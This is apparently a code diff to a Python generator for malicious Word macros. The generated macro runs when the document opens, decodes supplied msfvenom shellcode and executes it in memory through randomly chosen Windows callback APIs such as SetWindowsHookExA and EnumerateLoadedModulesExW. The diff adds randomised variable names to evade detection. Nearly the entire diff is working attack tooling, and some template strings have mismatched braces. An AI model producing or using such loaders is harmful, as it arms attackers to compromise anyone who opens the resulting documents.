-                    'call': '$executeResult = $shellExecute($processHandle, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "dbghelp" Alias "EnumerateLoadedModulesExW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{processHandle}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -558,8 +568,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "GrayStringA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any, ByVal {7} As Any, ByVal {8} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($moduleHandle, $oL, $memoryAddress, $oL, $oL, $oL, $oL, $oL, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "GrayStringA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any, ByVal {7} As Any, ByVal {8} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{moduleHandle}}, ${{ol}}, ${{memoryAddress}}, ${{ol}}, ${{ol}}, ${{ol}}, ${{ol}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -570,8 +580,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "GrayStringW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any, ByVal {7} As Any, ByVal {8} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($moduleHandle, $oL, $memoryAddress, $oL, $oL, $oL, $oL, $oL, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "GrayStringW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any, ByVal {7} As Any, ByVal {8} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{moduleHandle}}, ${{ol}}, ${{memoryAddress}}, ${{ol}}, ${{ol}}, ${{ol}}, ${{ol}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -582,8 +592,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "iphlpapi" Alias "NotifyIpInterfaceChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $oL, $oL, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "iphlpapi" Alias "NotifyIpInterfaceChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{ol}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -593,8 +603,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "iphlpapi" Alias "NotifyTeredoPortChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($memoryAddress, $oL, $oL, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "iphlpapi" Alias "NotifyTeredoPortChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{memoryAddress}}, ${{ol}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -605,8 +615,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "iphlpapi" Alias "NotifyUnicastIpAddressChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $oL, $oL, $oL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "iphlpapi" Alias "NotifyUnicastIpAddressChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{ol}}, ${{ol}}, ${{ol}})\n'
                     }
                 ]
             },
@@ -616,8 +626,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "shlwapi" Alias "SHCreateThread" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $zL, $zL, $memoryAddress)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "shlwapi" Alias "SHCreateThread" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{zl}}, ${{zl}}, ${{memoryAddress}})\n'
                     }
                 ]
             },
@@ -628,8 +638,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "shlwapi" Alias "SHCreateThreadWithHandle" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $zL, $zL, $memoryAddress, $processHandle)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "shlwapi" Alias "SHCreateThreadWithHandle" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{zl}}, ${{zl}}, ${{memoryAddress}}, ${{processHandle}})\n'
                     }
                 ]
             },
@@ -640,8 +650,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SendMessageCallbackA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($windowHandle, $zL, $zL, $zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "SendMessageCallbackA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{windowHandle}}, ${{zl}}, ${{zl}}, ${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -652,8 +662,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SendMessageCallbackW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($windowHandle, $zL, $zL, $zL, $memoryAddress, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "SendMessageCallbackW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{windowHandle}}, ${{zl}}, ${{zl}}, ${{zl}}, ${{memoryAddress}}, ${{zl}})\n'
                     }
                 ]
             },
@@ -666,8 +676,8 @@ exeShell = {
 #                },
 #            'functions': [
 #                {
-#                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SetWinEventHook" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any) As Long\n',
-#                    'call': '$executeResult = $shellExecute($zL, $oL, $moduleHandle, $memoryAddress, $zL, $zL, $zL)\n'
+#                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "SetWinEventHook" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any) As Long\n',
+#                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{ol}}, ${{moduleHandle}}, ${{memoryAddress}}, ${{zl}}, ${{zl}}, ${{zl}})\n'
 #                    }
 #                ]
 #            },
@@ -677,8 +687,8 @@ exeShell = {
                 },
             'functions': [
                 {
-                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SetWindowsHookExA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
-                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL, $zL)\n'
+                    'declaration': 'Private Declare Function ${{shellExecute}} Lib "user32" Alias "SetWindowsHookExA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
+                    'call': '${{executeResult}} = ${{shellExecute}}(${{zl}}, ${{memoryAddress}}, ${{zl}}, ${{zl}})\n'
                     }
                 ]
             }
@@ -690,12 +700,12 @@ writeFunc = list(memWrite.keys())[random.randrange(0,len(memWrite),1)]
 shellFunc = list(exeShell.keys())[random.randrange(0,len(exeShell),1)]
 
 # Determine flags for support code required by the functions
-macFlag = []
+macFlag = flags
 
-for flagList in (memAlloc[allocFunc][0], memWrite[writeFunc][0], exeShell[shellFunc][0]):
-    for flag in flagList:
-        if flag not in macFlag:
-            macFlag.append(flag)
+# Unpack to update the flag values
+macFlag = {**macFlag, **memAlloc[allocFunc]['globalFlags']}
+macFlag = {**macFlag, **memWrite[writeFunc]['globalFlags']}
+macFlag = {**macFlag, **exeShell[shellFunc]['globalFlags']}
 
 macro = ''
 
@@ -712,49 +722,76 @@ macro += '''
 ''' % (allocFunc, writeFunc, shellFunc)
 
 # Headers
-macro += memAlloc[allocFunc][1]
-macro += memWrite[writeFunc][1]
-macro += exeShell[shellFunc][1]
-if 'WH' in macFlag:
-    macro += 'Private Declare Function getWindowHandle Lib "user32" Alias "GetActiveWindow" () As Long'
-if 'PH' in macFlag:
-    macro += 'Private Declare Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As Long'
-if 'TH' in macFlag:
-    macro += 'Private Declare Function getThreadHandle Lib "kernel32" Alias "GetCurrentThread" () As Long'
-if 'MH' in macFlag:
-    macro += 'Private Declare Function getModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long'
+for function in memAlloc[allocFunc]['functions']:
+    args = []
+    for i in range(0, countNumberedVars(function['declaration'])):
+        argName = randVarName(4, 16, allowedChars)
+        args.append(argName)
+        print(i)
+    print(args)
+    print(function['declaration'])
+    macro += function['declaration'].format(*args)
+
+for function in memWrite[writeFunc]['functions']:
+    args = []
+    for i in range(0, countNumberedVars(function['declaration'])):
+        argName = randVarName(4, 16, allowedChars)
+        args.append(argName)
+        print(i)
+    print(args)
+    print(function['declaration'])
+    macro += function['declaration'].format(*args)
+
+for function in exeShell[shellFunc]['functions']:
+    args = []
+    for i in range(0, countNumberedVars(function['declaration'])):
+        argName = randVarName(4, 16, allowedChars)
+        args.append(argName)
+        print(i)
+    print(args)
+    print(function['declaration'])
+    macro += function['declaration'].format(*args)
+    
+if macFlag['wh']:
+    macro += 'Private Declare Function ${getWindowHandle} Lib "user32" Alias "GetActiveWindow" () As Long'
+if macFlag['ph']:
+    macro += 'Private Declare Function ${getProcessHandle} Lib "kernel32" Alias "GetCurrentProcess" () As Long'
+if macFlag['th']:
+    macro += 'Private Declare Function ${getThreadHandle} Lib "kernel32" Alias "GetCurrentThread" () As Long'
+if macFlag['mh']:
+    macro += 'Private Declare Function ${{getModuleHandle}} Lib "kernel32" Alias "GetModuleHandleA" (ByVal {0} As String) As Long'.format(randVarName(4, 12, allowedChars))
 
 # Body
 macro += '''\n
 Private Sub Document_Open()
 
-Dim shellCode As String
-Dim shellLength As Long
-Dim byteArray() As Byte
-Dim memoryAddress As Long
+Dim ${shellCode} As String
+Dim ${shellLength} As Long
+Dim ${byteArray}() As Byte
+Dim ${{memoryAddress}} As Long
 '''
 
 # Supporting code for functions
-if 'WH' in macFlag:
-    macro += 'Dim windowHandle As Long\n' +\
-             'windowHandle = getWindowHandle()\n'
-if 'PH' in macFlag:
-    macro += 'Dim ProcessHandle As Long\n' +\
-             'ProcessHandle = getProcessHandle()\n'
-if 'TH' in macFlag:
-    macro += 'Dim threadHandle As Long\n' +\
-             'threadHandle = getThreadHandle()\n'
-if 'MH' in macFlag:
-    macro += 'Dim moduleHandle As Long\n' +\
-             'moduleHandle = getModuleHandle(vbNullString)\n'
-if 'ZL' in macFlag:
-    macro += 'Dim zL As Long\n' +\
-             'zL = 0\n'
-if 'OL' in macFlag:
-    macro += 'Dim oL As Long\n' +\
-             'oL = 1\n'
-if 'RL' in macFlag:
-    macro += 'Dim rL As Long\n'
+if macFlag['wh']:
+    macro += 'Dim ${windowHandle} As Long\n' +\
+             '${{windowHandle} = getWindowHandle()\n'
+if macFlag['ph']:
+    macro += 'Dim ${processHandle}} As Long\n' +\
+             '${{processHandle} = getProcessHandle()\n'
+if macFlag['th']:
+    macro += 'Dim ${threadHandle}} As Long\n' +\
+             '${{threadHandle} = getThreadHandle()\n'
+if macFlag['mh']:
+    macro += 'Dim ${moduleHandle}} As Long\n' +\
+             '${moduleHandle} = getModuleHandle(vbNullString)\n'
+if macFlag['zl']:
+    macro += 'Dim ${zl} As Long\n' +\
+             '${zl} = 0\n'
+if macFlag['ol']:
+    macro += 'Dim ${ol} As Long\n' +\
+             '${ol} = 1\n'
+if macFlag['rl']:
+    macro += 'Dim ${rl} As Long\n'
 
 # Filter msfvenom C/Py output to get a hex-string, 'FEEDADEADFEDBABE'
 if len(sys.argv) == 2:
@@ -772,37 +809,43 @@ if len(sys.argv) == 2:
 
     if len(sys.argv[1]) > 256:
         macro += '''
-shellCode = "%s"''' % sys.argv[1][0:256]
+${shellCode} = "%s"''' % sys.argv[1][0:256]
         for i in range(256,len(sys.argv[1]),256):
             macro += '''
-shellCode = shellCode & "%s"''' % sys.argv[1][i:i+256]
+${shellCode} = ${shellCode} & "%s"''' % sys.argv[1][i:i+256]
     else:
         macro += '''
-shellCode = "%s"''' % sys.argv[1]
+${shellCode} = "%s"''' % sys.argv[1]
 else:
     print('[!] ERROR: Supply hexadecimal shellcode as input (eg msfvenom -p windows/exec CMD=\'calc.exe\' -f c)')
     sys.exit(1)
 
 macro += '''\n
-shellLength = Len(shellCode) / 2
-ReDim byteArray(0 To shellLength)
+${shellLength} = Len(${shellCode}) / 2
+ReDim ${byteArray}(0 To ${shellLength})
 
-For i = 0 To shellLength - 1
+For i = 0 To ${shellLength} - 1
 
     If i = 0 Then
         pos = i + 1
     Else
         pos = i * 2 + 1
     End If
-    Value = Mid(shellCode, pos, 2)
-    byteArray(i) = Val("&H" & Value)
+    Value = Mid(${shellCode}, pos, 2)
+    ${byteArray}(i) = Val("&H" & Value)
 
 Next\n
 '''
 
-macro += memAlloc[allocFunc][2] + '\n'
-macro += memWrite[writeFunc][2] + '\n'
-macro += exeShell[shellFunc][2] + '\n'
+# Add the function calls
+for function in memAlloc[allocFunc]['functions']:
+    macro += function['call'] + '\n'
+
+for function in memWrite[writeFunc]['functions']:
+    macro += function['call'] + '\n'
+
+for function in exeShell[shellFunc]['functions']:
+    macro += function['call'] + '\n'
 
 macro += "End Sub"
 
